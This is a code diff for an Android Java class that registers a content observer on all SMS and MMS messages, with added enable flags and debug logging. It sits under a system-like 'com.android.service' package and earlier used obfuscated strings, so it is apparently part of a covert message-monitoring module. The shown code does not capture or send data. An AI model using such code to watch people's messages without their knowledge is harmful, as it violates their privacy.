@@ -1,4 +1,4 @@
-package com.android.service.interfaces;
+package com.android.service.module.message;
 
 import android.content.ContentResolver;
 import android.database.ContentObserver;
@@ -7,14 +7,27 @@ import android.os.Handler;
 import android.os.Looper;
 import android.os.Message;
 
-import com.android.service.Messages;
 import com.android.service.Status;
+import com.android.service.auto.Cfg;
+import com.android.service.util.Check;
 
-public class SmsHandler extends Thread {
+public class MsgHandler extends Thread {
 	private static final String TAG = "SmsHandler"; //$NON-NLS-1$
 
 	private Handler handler;
-	private ContentObserver smsObserver;
+
+	//private ContentObserver smsObserver;
+	//private ContentObserver mmsObserver;
+	private ContentObserver msgObserver;
+
+	private boolean smsEnabled;
+
+	private boolean mmsEnabled;
+
+	public MsgHandler(boolean smsEnabled, boolean mmsEnabled) {
+		this.smsEnabled = smsEnabled;
+		this.mmsEnabled = mmsEnabled;
+	}
 
 	@Override
 	public void run() {
@@ -24,10 +37,11 @@ public class SmsHandler extends Thread {
 			@Override
 			public void handleMessage(Message msg) {
 				// process incoming messages here
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (handleMessage): " + msg);
+				}
 			}
 		};
-
-		smsObserver = new SmsObserver(handler);
 
 		final ContentResolver cr = Status.getAppContext().getContentResolver();
 
@@ -40,7 +54,17 @@ public class SmsHandler extends Thread {
 		 * All Conversations = "content://mms-sms/conversations" All messages =
 		 * "content://mms-sms" All SMS = "content://sms"
 		 */
-		cr.registerContentObserver(Uri.parse(Messages.getString("25.0")), true, smsObserver); //$NON-NLS-1$
+
+		// content://sms
+		// Messages.getString("25.0") : "content://sms"
+
+
+
+		
+			msgObserver = new MsgObserver(handler, mmsEnabled, smsEnabled);
+			cr.registerContentObserver(Uri.parse("content://mms-sms"), true, msgObserver); //$NON-NLS-1$
+		
+	
 
 		Looper.loop();
 	}
